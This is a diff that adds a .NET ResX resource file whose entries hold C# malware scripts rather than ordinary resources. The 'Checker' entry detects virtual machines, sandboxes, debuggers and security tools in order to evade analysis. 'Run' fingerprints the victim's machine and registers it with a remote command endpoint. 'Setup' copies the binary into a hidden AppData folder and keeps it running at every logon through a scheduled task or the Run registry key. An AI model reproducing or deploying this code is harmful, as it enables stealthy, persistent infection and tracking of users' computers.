@@ -1,0 +1,419 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="Checker" xml:space="preserve">
+    <value>using System.Threading.Tasks;using Microsoft.Win32;using System;using System.Diagnostics;using System.Linq;using System.Net.NetworkInformation;using System.Runtime.InteropServices;using System.Windows.Forms;using System.Management;using System.IO;using System.Threading;using System.Net.Http;public class Script{private static readonly string[]vmProcesses={"vmtoolsd","vboxservice","vmsrvc","vmusrvc","vboxtray","xenservice","qemu-ga"};private static readonly string[]vmMacAddresses={"00:05:69","00:0C:29","00:50:56","00:1C:14","08:00:27","00:15:5D","00:03:FF","00:0F:4B"};private static readonly string[]vmRegistryKeys={@"SOFTWARE\VMware, Inc.\VMware Tools",@"SOFTWARE\Oracle\VirtualBox Guest Additions",@"HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer",@"HARDWARE\DESCRIPTION\System\BIOS\SystemProductName"};private static readonly string[]sandboxProcesses={"sbiectrl","snxhk","nspectr","wsb","capesandbox","joeboxcontrol","analyze","procexp","zenbox"};private static readonly string[]knownSandboxFiles={"C:\\windows\\sysnative\\drivers\\sandboxie.sys","C:\\windows\\system32\\drivers\\sandboxie.sys","C:\\windows\\sysnative\\drivers\\cuckoo.sys","C:\\windows\\system32\\drivers\\cuckoo.sys","C:\\windows\\sysnative\\drivers\\zenbox.sys","C:\\windows\\system32\\drivers\\zenbox.sys","C:\\windows\\system32\\vmGuestLib.dll","C:\\windows\\system32\\vm3dgl.dll","C:\\windows\\system32\\vboxhook.dll","C:\\windows\\system32\\vboxmrxnp.dll","C:\\windows\\system32\\vmsrvc.dll","C:\\windows\\system32\\drivers\\vmsrvc.sys"};private static readonly string[]selectedProcessList={"processhacker","netstat","netmon","tcpview","wireshark","filemon","regmon","cain","procmon","sysinternals","nagios","zabbix","solarwinds","prtg","splunk","kismet","nmap","ettercap","vmtoolsd","vmwaretray","vmwareuser","fakenet","dumpcap","httpdebuggerui","wireshark","fiddler","vboxservice","df5serv","vboxtray","vmwaretray","ida64","ollydbg","pestudio","vgauthservice","vmacthlp","x96dbg","x32dbg","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"};private static readonly string[]rdpProcesses={"mstsc","rdpclip","conhost"};public static async Task&lt;string&gt;ExecuteAsync(){if(CheckForVMProcesses()||CheckForVMArtifacts()||CheckForVMHardware()||CheckForVMMACAddress()||CheckForCPUandMemoryDiscrepancies()||CheckRegistryKeys()||CheckForSandbox()||CheckForRDP()||CheckForVPSEnvironment()||CheckECCSupport()||IsServerCPU()||IsProxyDetectedUsingRegistry()||DetectMonitiringTool()||DetectDebugger()||await IpChecker()||DetectEmulatorByTime()||DetectSandBoxByDll()){Environment.Exit(0);}return"";}private static bool CheckForVMProcesses(){foreach(var processName in vmProcesses){if(Process.GetProcessesByName(processName).Length&gt;0){return true;}}return false;}private static bool CheckForVMArtifacts(){using(var searcher=new ManagementObjectSearcher("Select * from Win32_ComputerSystem")){foreach(var item in searcher.Get()){string manufacturer=item["Manufacturer"].ToString().ToLower();string model=item["Model"].ToString().ToLower();if((manufacturer.Contains("microsoft")&amp;&amp;model.Contains("virtual"))||manufacturer.Contains("vmware")||manufacturer.Contains("xen")||manufacturer.Contains("oracle")||model.Contains("virtualbox")||model.Contains("qemu")){return true;}}}using(var videoSearcher=new ManagementObjectSearcher("root\\CIMV2","SELECT * FROM Win32_VideoController")){foreach(var item in videoSearcher.Get()){string videoName=item.GetPropertyValue("Name").ToString().ToLower();if(videoName.Contains("vmware")||videoName.Contains("vbox")||videoName.Contains("qemu")){return true;}}}return false;}private static bool CheckForVMHardware(){using(var searcher=new ManagementObjectSearcher("Select * from Win32_BIOS")){foreach(var item in searcher.Get()){string manufacturer=item["Manufacturer"].ToString().ToLower();string version=item["Version"].ToString().ToLower();if(manufacturer.Contains("vmware")||manufacturer.Contains("xen")||manufacturer.Contains("qemu")||version.Contains("virtualbox")||version.Contains("vbox")){return true;}}}using(var searcher=new ManagementObjectSearcher("Select * from Win32_Processor")){foreach(var item in searcher.Get()){string manufacturer=item["Manufacturer"].ToString().ToLower();string version=item["Version"].ToString().ToLower();if(manufacturer.Contains("vmware")||manufacturer.Contains("xen")||manufacturer.Contains("qemu")||version.Contains("virtualbox")||version.Contains("vbox")){return true;}}}using(var searcher=new ManagementObjectSearcher("Select * from Win32_BaseBoard")){foreach(var item in searcher.Get()){string manufacturer=item["Manufacturer"].ToString().ToLower();string product=item["Product"].ToString().ToLower();if(manufacturer.Contains("vmware")||manufacturer.Contains("xen")||manufacturer.Contains("qemu")||product.Contains("virtualbox")||product.Contains("vbox")){return true;}}}return false;}private static bool CheckForVMMACAddress(){foreach(NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces()){if(nic.Description.ToLower().Contains("virtual")||nic.Description.ToLower().Contains("vmware")){continue;}string macAddress=nic.GetPhysicalAddress().ToString();if(vmMacAddresses.Any(vmMac=&gt;macAddress.StartsWith(vmMac.Replace(":",""),StringComparison.OrdinalIgnoreCase))){return true;}}return false;}private static bool CheckForCPUandMemoryDiscrepancies(){int logicalProcessors=Environment.ProcessorCount;if(logicalProcessors&lt;=2){return true;}return false;}private static bool CheckRegistryKeys(){foreach(string key in vmRegistryKeys){using(RegistryKey registryKey=Registry.LocalMachine.OpenSubKey(key)){if(registryKey!=null){return true;}}}return false;}private static bool CheckForSandbox(){foreach(var processName in sandboxProcesses){if(Process.GetProcessesByName(processName).Length&gt;0){return true;}}foreach(var filePath in knownSandboxFiles){if(File.Exists(filePath)){return true;}}using(var searcher=new ManagementObjectSearcher("Select * from Win32_ComputerSystem")){foreach(var item in searcher.Get()){string manufacturer=item["Manufacturer"].ToString().ToLower();string model=item["Model"].ToString().ToLower();if(manufacturer.Contains("microsoft")&amp;&amp;model.Contains("windows sandbox")){return true;}}}using(var searcher=new ManagementObjectSearcher("Select * from Win32_BIOS")){foreach(var item in searcher.Get()){string manufacturer=item["Manufacturer"].ToString().ToLower();string version=item["Version"].ToString().ToLower();if(manufacturer.Contains("sandboxie")||version.Contains("sandboxie")){return true;}}}return false;}private static bool CheckForRDP(){if(SystemInformation.TerminalServerSession){return true;}return false;}private static bool CheckForVPSEnvironment(){using(var searcher=new ManagementObjectSearcher("Select * from Win32_ComputerSystem")){foreach(var item in searcher.Get()){string model=item["Model"].ToString().ToLower();if(model.Contains("vps")||model.Contains("virtual")||model.Contains("cloud")){return true;}}}return false;}private static bool CheckECCSupport(){bool isECCSupported=false;try{using(ManagementObjectSearcher searcher=new ManagementObjectSearcher("root\\CIMV2","SELECT * FROM Win32_PhysicalMemory")){foreach(ManagementObject queryObj in searcher.Get()){if(queryObj["MemoryType"]!=null){ushort memoryType=(ushort)queryObj["MemoryType"];if(memoryType==24){isECCSupported=true;break;}}if(queryObj["ErrorCorrectionType"]!=null){ushort errorCorrectionType=(ushort)queryObj["ErrorCorrectionType"];if(errorCorrectionType==6){isECCSupported=true;break;}}}}}catch(ManagementException){}return isECCSupported;}private static bool IsServerCPU(){string cpuName=Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");if(cpuName.Contains("Xeon")||cpuName.Contains("EPYC")){return true;}return false;}static bool IsProxyDetectedUsingRegistry(){const string registryKey=@"Software\Microsoft\Windows\CurrentVersion\Internet Settings";try{using(RegistryKey key=Registry.CurrentUser.OpenSubKey(registryKey,false)){if(key!=null){object proxyEnable=key.GetValue("ProxyEnable");if(proxyEnable!=null&amp;&amp;(int)proxyEnable==1){return true;}}}}catch(Exception){}return false;}public static bool DetectMonitiringTool(){foreach(var processName in selectedProcessList){if(Process.GetProcessesByName(processName).Length&gt;0){return true;}}return false;}[DllImport("kernel32.dll",SetLastError=true)]static extern bool IsDebuggerPresent();public static bool DetectDebugger(){if(IsDebuggerPresent()||Debugger.IsAttached){return true;}return false;}public static async Task&lt;bool&gt;IpChecker(){while(true){try{using(var client=new HttpClient()){var status=await client.GetStringAsync("http://ip-api.com/line/?fields=proxy,hosting").ConfigureAwait(false);return status.Contains("true");}}catch{}Thread.Sleep(15000);}}public static bool DetectEmulatorByTime(){try{var ticks=DateTime.Now.Ticks;Thread.Sleep(10);if(DateTime.Now.Ticks-ticks&lt;10L)return true;}catch{}return false;}[DllImport("kernel32.dll")]private static extern IntPtr GetModuleHandle(string lpModuleName);public static bool DetectSandBoxByDll(){var dlls=new[]{"SbieDll","SxIn","Sf2","snxhk","cmdvrt32"};return dlls.Any(dll=&gt;GetModuleHandle(dll+".dll").ToInt32()!=0);}}</value>
+  </data>
+  <data name="Run" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+using System.Management;
+using System.Collections.Generic;
+using System.Security.Principal;
+public class Script
+{
+    static string GetUsername()
+    {
+        return WindowsIdentity.GetCurrent().Name;
+    }
+    static string GetWindowsVersion()
+    {
+        try
+        {
+            using (
+                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem")
+            )
+            {
+                string info = "";
+                foreach (var obj in searcher.Get())
+                {
+                    info += obj["Caption"] + " " + obj["BuildNumber"] + " " + obj["OSArchitecture"];
+                }
+                return info;
+            }
+        }
+        catch (Exception) { }
+        return "";
+    }
+    public static string GetSystemInfo()
+    {
+        StringBuilder sb = new StringBuilder();
+
+        // CPU Information
+        sb.AppendLine(GetCpuInfo());
+
+        // RAM Information
+        var ramInfo = GetRAMInfo();
+        foreach (var ram in ramInfo)
+        {
+            // sb.AppendLine(string.Format("{0} - {1} GB", ram.Item1, ram.Item2));
+        }
+        // GPU Information
+        sb.AppendLine(GetGpuInfo());
+
+        // Disk Information
+        sb.AppendLine(GetDiskInfo());
+
+        return sb.ToString();
+    }
+
+    private static string GetCpuInfo()
+    {
+        StringBuilder cpuInfo = new StringBuilder();
+        string cpuName = GetCpuName();
+        int cpuCores = GetCpuCores();
+        int cpuThreads = GetCpuThreads();
+
+        cpuInfo.AppendLine(cpuName + " " + cpuCores + "/" + cpuThreads);
+        return cpuInfo.ToString();
+    }
+
+
+    private static string GetCpuName()
+    {
+        try
+        {
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
+            ManagementObjectCollection collection = searcher.Get();
+            foreach (ManagementObject obj in collection)
+            {
+                string name = obj["Name"] != null ? obj["Name"].ToString().Replace("  ", " ").Trim() : "N/A";
+                return name;
+            }
+        }
+        catch
+        {
+            return "N/A";
+        }
+        return "N/A";
+    }
+
+    private static int GetCpuCores()
+    {
+        try
+        {
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT NumberOfCores FROM Win32_Processor");
+            ManagementObjectCollection collection = searcher.Get();
+            foreach (ManagementObject obj in collection)
+            {
+                return int.Parse(obj["NumberOfCores"] != null ? obj["NumberOfCores"].ToString() : "0");
+            }
+        }
+        catch
+        {
+            return 0;
+        }
+        return 0;
+    }
+
+    private static int GetCpuThreads()
+    {
+        try
+        {
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT NumberOfLogicalProcessors FROM Win32_Processor");
+            ManagementObjectCollection collection = searcher.Get();
+            foreach (ManagementObject obj in collection)
+            {
+                return int.Parse(obj["NumberOfLogicalProcessors"] != null ? obj["NumberOfLogicalProcessors"].ToString() : "0");
+            }
+        }
+        catch
+        {
+            return 0;
+        }
+        return 0;
+    }
+
+    private static string GetGpuInfo()
+    {
+        try
+        {
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");
+            ManagementObjectCollection collection = searcher.Get();
+            foreach (ManagementObject obj in collection)
+            {
+                return obj["Name"] != null ? obj["Name"].ToString() : "N/A";
+            }
+        }
+        catch
+        {
+            return "N/A";
+        }
+        return "N/A";
+    }
+
+    private static string GetDiskInfo()
+    {
+        StringBuilder diskInfo = new StringBuilder();
+        Dictionary&lt;string, string&gt; disks = new Dictionary&lt;string, string&gt;();
+
+        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
+        using (ManagementObjectCollection collection = searcher.Get())
+        {
+            foreach (ManagementObject disk in collection)
+            {
+                string model = disk["Model"] != null ? disk["Model"].ToString() : "Unknown";
+                long sizeBytes = long.Parse(disk["Size"] != null ? disk["Size"].ToString() : "0");
+                double sizeGB = Math.Round((double)sizeBytes / (1024 * 1024 * 1024), 2);
+                disks.Add(model, sizeGB + " GB");
+            }
+        }
+
+        int diskCount = 1;
+        foreach (KeyValuePair&lt;string, string&gt; disk in disks)
+        {
+            diskInfo.AppendLine("DISK " + diskCount + " " + disk.Key + " - " + disk.Value);
+            diskCount++;
+        }
+
+        return diskInfo.ToString();
+    }
+
+    private static List&lt;Tuple&lt;string, double&gt;&gt; GetRAMInfo()
+    {
+        List&lt;Tuple&lt;string, double&gt;&gt; ramList = new List&lt;Tuple&lt;string, double&gt;&gt;();
+
+        try
+        {
+            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Manufacturer, PartNumber, Capacity FROM Win32_PhysicalMemory"))
+            using (ManagementObjectCollection collection = searcher.Get())
+            {
+                foreach (ManagementObject ram in collection)
+                {
+                    string manufacturer = ram["Manufacturer"] != null ? ram["Manufacturer"].ToString().Trim() : "Unknown";
+                    string partNumber = ram["PartNumber"] != null ? ram["PartNumber"].ToString().Trim() : "Unknown";
+                    long capacityBytes = Convert.ToInt64(ram["Capacity"]);
+                    double capacityGB = Math.Round((double)capacityBytes / (1024 * 1024 * 1024), 2);
+
+                    string name = string.Format("{0} {1}", manufacturer, partNumber).Trim();
+                    if (string.IsNullOrWhiteSpace(name))
+                    {
+                        name = "Unknown RAM";
+                    }
+
+                    ramList.Add(new Tuple&lt;string, double&gt;(name, capacityGB));
+                }
+            }
+        }
+        catch
+        {
+            // Handle the exception if necessary
+        }
+
+        return ramList;
+    }
+    static string GenerateUUID()
+    {
+        FileInfo fileInfo = new FileInfo(Process.GetCurrentProcess().MainModule.FileName);
+        byte[] timestampBytes = BitConverter.GetBytes(fileInfo.LastWriteTime.Ticks);
+
+        byte[] hashBytes;
+        using (SHA256 sha256 = SHA256.Create())
+        {
+            hashBytes = sha256.ComputeHash(timestampBytes);
+        }
+        return BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
+    }
+    
+    static async Task SignUp(string endpoint)
+    {
+        while (true)
+        {
+            await Task.Delay(new Random().Next(0, 5000));
+            using (HttpClient client = new HttpClient())
+            {
+                try
+                {
+                    var content = new StringContent(
+                        "{\"id\":\""
+                            + GenerateUUID()
+                            + "\",\"Name\":\""
+                            + GetUsername().Replace("\\", "-")
+                            + "\",\"Version\":\""
+                            + GetWindowsVersion()
+                            + "\",\"SystemSpecs\":\""
+                            + GetSystemInfo().Replace("\n", "\\n").Replace("\r", "\\r")
+                            + "\",\"ipAddress\":\"asd\"}",
+                        Encoding.UTF8,
+                        "application/json"
+                    );
+                    var response = await client.PostAsync(endpoint + "Client/New", content);
+
+                    if (response.IsSuccessStatusCode)
+                    {
+                        break;
+                    }
+                }
+                catch (Exception) { }
+            }
+        }
+    }
+    public static async Task&lt;string&gt; ExecuteAsync(string endpoint)
+    {
+        var exist = await Login(endpoint);
+        
+        if (!exist)
+        {   
+            await SignUp(endpoint);
+        }
+        return GenerateUUID();
+    }
+    static async Task&lt;bool&gt; Login(string endpoint)
+    {
+        while (true)
+        {
+            await Task.Delay(new Random().Next(0, 2000));
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    var content = new StringContent(
+                        "{\"id\":\"" + GenerateUUID() + "\"}",
+                        Encoding.UTF8,
+                        "application/json"
+                    );
+                    HttpResponseMessage response = await client.PostAsync(
+                        endpoint + "Client",
+                        content
+                    );
+
+                    if (response.IsSuccessStatusCode)
+                    {
+                        return true;
+                    }
+                    else if (response.StatusCode == System.Net.HttpStatusCode.NotFound)
+                    {
+                        return false;
+                    }
+                }
+            }
+            catch (Exception) { }
+        }
+    }
+}</value>
+  </data>
+  <data name="Setup" xml:space="preserve">
+    <value>using System;using System.Diagnostics;using System.IO;using System.Threading.Tasks;using System.Windows.Forms;using Microsoft.Win32;public class Script{private static void StoreTheFile(){string executablePath=Process.GetCurrentProcess().MainModule.FileName;string appDataPath=Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);string xbFolderPath=Path.Combine(appDataPath,"xbb");Directory.CreateDirectory(xbFolderPath);string destinationPath=Path.Combine(xbFolderPath,"xspeed11.exe");if(!File.Exists(destinationPath)){File.Copy(executablePath,destinationPath);Process.Start(destinationPath);Environment.Exit(0);}}public static async Task&lt;string&gt;ExecuteAsync(){StoreTheFile();SetupTaskScheduler("SPEED");return"";}public static void AddApplicationToStartup(){using(RegistryKey key=Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",writable:true)){string appName="Xzigzag";string appPath=Application.ExecutablePath;if(key.GetValue(appName)==null){key.SetValue(appName,appPath);Environment.Exit(0);}}}private static void SetupTaskScheduler(string taskName){if(!TaskExists(taskName)){string taskCommand="/Create /SC ONLOGON /TN \""+taskName+"\" /TR \""+Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"xbb","xspeed11.exe")+"\"";RunProcess("schtasks.exe",taskCommand);if(!TaskExists(taskName)){AddApplicationToStartup();}else{Environment.Exit(0);}}}private static bool TaskExists(string taskName){string queryCommand="/Query /TN \""+taskName+"\"";using(Process process=RunProcess("schtasks.exe",queryCommand,true)){return process.ExitCode==0;}}private static Process RunProcess(string fileName,string arguments,bool redirectOutput=false){ProcessStartInfo processStartInfo=new ProcessStartInfo{FileName=fileName,Arguments=arguments,UseShellExecute=!redirectOutput,CreateNoWindow=true,RedirectStandardOutput=redirectOutput,RedirectStandardError=redirectOutput};Process process=new Process{StartInfo=processStartInfo};process.Start();process.WaitForExit();return process;}}</value>
+  </data>
+</root>
